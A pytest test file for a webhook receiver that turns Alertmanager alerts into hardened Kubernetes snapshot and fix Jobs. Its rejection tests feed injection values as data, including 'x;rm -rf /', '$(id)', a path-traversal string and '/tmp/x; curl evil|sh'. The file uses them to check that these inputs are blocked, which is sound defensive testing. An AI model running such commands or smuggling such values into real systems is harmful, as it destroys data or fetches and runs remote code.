"""platform/alert-triage/receiver/receiver.py: webhooks in, Job manifests out."""
from __future__ import annotations

import importlib.util
import json
from pathlib import Path

import pytest

SRC = Path(__file__).resolve().parent.parent / "platform" / "alert-triage" / "receiver" / "receiver.py"
NOW = 1_800_000_000


def load(monkeypatch, **env):
    monkeypatch.setenv("SNAPSHOT_IMAGE", "alpine/k8s:test")
    for k, v in env.items():
        monkeypatch.setenv(k, v)
    spec = importlib.util.spec_from_file_location("receiver", SRC)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def webhook(status="firing", name="GatewayDown", key='{}/{action="human"}:{alertname="GatewayDown"}', **labels):
    alert = {"status": status, "labels": {"alertname": name, "action": "human", **labels}, "annotations": {}}
    return {"version": "4", "status": status, "groupKey": key, "receiver": "alert-triage",
            "groupLabels": {"alertname": name}, "commonLabels": alert["labels"], "alerts": [alert]}


def logs(capsys) -> list[dict]:
    return [json.loads(line) for line in capsys.readouterr().out.splitlines()]


def run(mod, payload, table=None, fail=False):
    created = []

    def create(job):
        if fail:
            raise OSError("apiserver unreachable")
        created.append(job)
        return "created"
    return mod.handle(payload, table or {}, create=create, now=NOW), created


def test_firing_starts_one_snapshot_job(monkeypatch, capsys):
    mod = load(monkeypatch, AM_URL="http://am.test:9093", STORE_URL="https://store.test/?q={id}")
    code, jobs = run(mod, webhook())
    assert code == 200 and len(jobs) == 1
    job = jobs[0]
    spec = job["spec"]["template"]["spec"]
    c = spec["containers"][0]
    env = {e["name"]: e["value"] for e in c["env"]}
    incident = mod.incident_id(webhook()["groupKey"])
    assert job["metadata"]["name"] == f"snapshot-{incident[:10]}-{NOW // 600}"
    assert job["metadata"]["namespace"] == "alert-triage"
    assert spec["serviceAccountName"] == "alert-triage-snapshot"
    assert c["image"] == "alpine/k8s:test"
    assert env["ALERTNAME"] == "GatewayDown" and env["INCIDENT_ID"] == incident and env["FIX"] == "none"
    assert env["AM_URL"] == "http://am.test:9093" and env["STORE_URL"] == "https://store.test/?q={id}"
    # Hardened: non-root, read-only root filesystem, no escalation, one try.
    assert spec["securityContext"]["runAsNonRoot"] is True
    assert c["securityContext"]["readOnlyRootFilesystem"] is True
    assert c["securityContext"]["allowPrivilegeEscalation"] is False
    assert job["spec"]["backoffLimit"] == 0
    events = [r["event"] for r in logs(capsys)]
    assert events == ["received", "snapshot"]


def test_retry_in_the_same_window_has_the_same_name(monkeypatch):
    mod = load(monkeypatch)
    _, a = run(mod, webhook())
    _, b = run(mod, webhook())
    assert a[0]["metadata"]["name"] == b[0]["metadata"]["name"]


def test_resolved_starts_nothing(monkeypatch, capsys):
    mod = load(monkeypatch)
    code, jobs = run(mod, webhook(status="resolved"))
    assert code == 200 and jobs == []
    recs = logs(capsys)
    assert recs[-1]["event"] == "resolved"
    assert recs[-1]["incident.id"] == mod.incident_id(webhook()["groupKey"])


@pytest.mark.parametrize("name", ["../../etc/passwd", "Gateway Down", "x;rm -rf /", "$(id)", ""])
def test_rejected_alertname_starts_nothing(monkeypatch, capsys, name):
    mod = load(monkeypatch)
    code, jobs = run(mod, webhook(name=name, binary="/tmp/x; curl evil|sh"))
    assert code == 200 and jobs == []
    rec = logs(capsys)[-1]
    assert rec["event"] == "failed" and rec["msg"] == "alertname rejected" and rec["alertname"] == ""


def test_labels_never_reach_a_job(monkeypatch):
    mod = load(monkeypatch)
    _, jobs = run(mod, webhook(binary="/tmp/evil; sh", pod="x$(id)"))
    text = json.dumps(jobs)
    assert "evil" not in text and "$(id)" not in text


def test_fix_from_the_table_runs_after_the_snapshot(monkeypatch, capsys):
    mod = load(monkeypatch)
    table = {"GatewayDown": {"serviceAccount": "fix-gatewaydown", "image": "fix:1", "command": ["/fix.sh"]}}
    _, jobs = run(mod, webhook(), table)
    assert [j["metadata"]["labels"]["alert-triage/kind"] for j in jobs] == ["snapshot", "fix"]
    fix = jobs[1]["spec"]["template"]["spec"]
    assert fix["serviceAccountName"] == "fix-gatewaydown"
    assert fix["containers"][0]["image"] == "fix:1" and fix["containers"][0]["command"] == ["/fix.sh"]
    env = {e["name"]: e["value"] for e in jobs[0]["spec"]["template"]["spec"]["containers"][0]["env"]}
    assert env["FIX"] == "GatewayDown"
    assert [r["event"] for r in logs(capsys)] == ["received", "snapshot", "fix"]


def test_no_fix_for_another_alert(monkeypatch):
    mod = load(monkeypatch)
    table = {"Other": {"serviceAccount": "fix-other", "image": "fix:1", "command": ["/fix.sh"]}}
    _, jobs = run(mod, webhook(), table)
    assert len(jobs) == 1


def test_create_failure_is_logged_and_retried(monkeypatch, capsys):
    mod = load(monkeypatch)
    code, _ = run(mod, webhook(), fail=True)
    assert code == 500
    rec = logs(capsys)[-1]
    assert rec["event"] == "failed" and "snapshot job not created" in rec["msg"]


def test_log_line_shape(monkeypatch, capsys):
    mod = load(monkeypatch)
    run(mod, webhook())
    for rec in logs(capsys):
        assert {"time", "event", "incident.id", "alertname"} <= set(rec)
        assert rec["event"] in {"received", "snapshot", "fix", "resolved", "failed"}


def test_table(monkeypatch, tmp_path):
    mod = load(monkeypatch)
    assert mod.load_table(str(tmp_path / "missing.json")) == {}
    p = tmp_path / "fixes.json"
    p.write_text("{}")
    assert mod.load_table(str(p)) == {}
    p.write_text(json.dumps({"Bad Name": {"serviceAccount": "a", "image": "b", "command": []}}))
    with pytest.raises(ValueError):
        mod.load_table(str(p))
    p.write_text(json.dumps({"Good": {"image": "b"}}))
    with pytest.raises(ValueError):
        mod.load_table(str(p))
